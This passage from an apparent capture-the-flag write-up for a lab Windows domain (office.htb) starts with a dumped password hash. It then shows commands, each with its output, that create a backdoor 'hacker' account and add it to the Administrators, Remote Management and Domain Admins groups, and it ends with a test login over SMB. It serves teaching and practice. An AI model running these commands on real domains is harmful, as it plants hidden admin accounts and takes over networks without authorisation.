OFFICE\DC$:aad3b435b51404eeaad3b435b51404ee:0ddf0e8e5b48cf2085a16e86c1a3bf49:::

[...]
```

![Victim: hhogan](https://custom-icon-badges.demolab.com/badge/Victim-hhogan-64b5f6?logo=windows11&logoColor=white)

`net user hacker 'H4ck3d!' /add /domain`:
```
The command completed successfully.
```

`net user`:
```
User accounts for \\

-------------------------------------------------------------------------------
Administrator            dlanor                   dmichael
dwolfe                   etower                   EWhite
Guest                    hacker 📌                HHogan
krbtgt                   PPotts                   tstark
web_account
The command completed with one or more errors.
```

`net localgroup 'Administrators' hacker /add`:
```
The command completed successfully.
```

`net user hacker`:
```
User name                    hacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2024 11:49:12 AM
Password expires             12/30/2024 11:49:12 AM
Password changeable          11/19/2024 11:49:12 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators 📌
Global Group memberships     *Domain Users 📌
The command completed successfully.
```

`net localgroup 'Remote Management Users' hacker /add`:
```
The command completed successfully.
```

`net user hacker`:
```
User name                    hacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2024 11:49:12 AM
Password expires             12/30/2024 11:49:12 AM
Password changeable          11/19/2024 11:49:12 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use 📌
Global Group memberships     *Domain Users
The command completed successfully.
```

`net localgroup 'Domain Admins' hacker /add`:
```
The command completed successfully.
```

`net user hacker`:
```
User name                    hacker
Full Name
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            11/18/2024 11:49:12 AM
Password expires             12/30/2024 11:49:12 AM
Password changeable          11/19/2024 11:49:12 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   Never

Logon hours allowed          All

Local Group Memberships      *Administrators       *Remote Management Use
Global Group memberships     *Domain Admins 📌     *Domain Users
The command completed successfully.
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`netexec smb 10.10.11.3 -u 'hacker' -p 'H4ck3d!'`:
```
SMB         10.10.11.3      445    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:office.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.3      445    DC               [-] office.htb\hacker:H4ck3d! STATUS_LOGON_FAILURE
```
❌

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
